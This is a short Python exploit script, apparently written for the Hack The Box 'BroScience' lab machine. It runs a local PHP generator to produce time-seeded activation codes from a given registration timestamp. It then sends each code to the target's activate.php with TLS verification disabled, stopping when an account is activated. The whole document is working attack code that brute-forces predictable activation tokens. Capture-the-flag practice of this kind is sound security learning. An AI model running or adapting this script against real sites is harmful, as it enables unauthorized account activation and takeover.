import os
import sys
import requests

requests.packages.urllib3.disable_warnings()

def check_code(code):
    res = requests.request('GET', 'https://broscience.htb/activate.php?code=' + str(code), verify=False)
    if 'Invalid' not in res.text:
        print("Code found: " + str(code) + 'Account activated')
        print(res.text)
        return True
    print(f'Ivalid: {code}')
    return False

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <unix_time_of_register>")
    sys.exit(1)

base_t = sys.argv[1]

cmd = f"php ./php/includes/activation_code.php {base_t} > codes"
os.system(cmd)

with open('codes', 'r') as f:
    codes = f.read().splitlines()
    for c in codes:
        code_len = len(c)
        if code_len == 0:
            continue
        if code_len == 10:
            print('Time:', c)
        if code_len == 32:
            if check_code(c):
                break